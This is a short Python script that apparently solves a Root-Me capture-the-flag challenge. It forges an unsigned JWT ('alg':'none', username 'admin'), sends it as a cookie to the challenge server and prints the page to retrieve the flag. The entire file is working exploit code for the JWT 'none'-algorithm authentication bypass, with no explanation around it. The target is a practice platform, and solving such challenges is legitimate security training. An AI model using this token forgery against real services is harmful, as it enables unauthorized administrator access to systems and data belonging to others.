import base64
import requests


def base64_encode(plan_text):
    char_encoding = "ascii"
    s_bytes = plan_text.encode(char_encoding)
    return base64.b64encode(s_bytes).decode(char_encoding)

# --------------------------------------------------------------------------MAIN--------------------------------------------------------


def main():
    header = '{"typ":"JWT","alg":"none"}'
    payload = '{"username":"admin"}'

    jwt = f"{base64_encode(header)}.{base64_encode(payload)}."
    url = 'http://challenge01.root-me.org/web-serveur/ch58/index.php'
    cookies = {'jwt': jwt}
    req = requests.get(url, cookies=cookies)
    
    print(req.text)
    #find flag
    pass


if __name__ == "__main__":
    main()
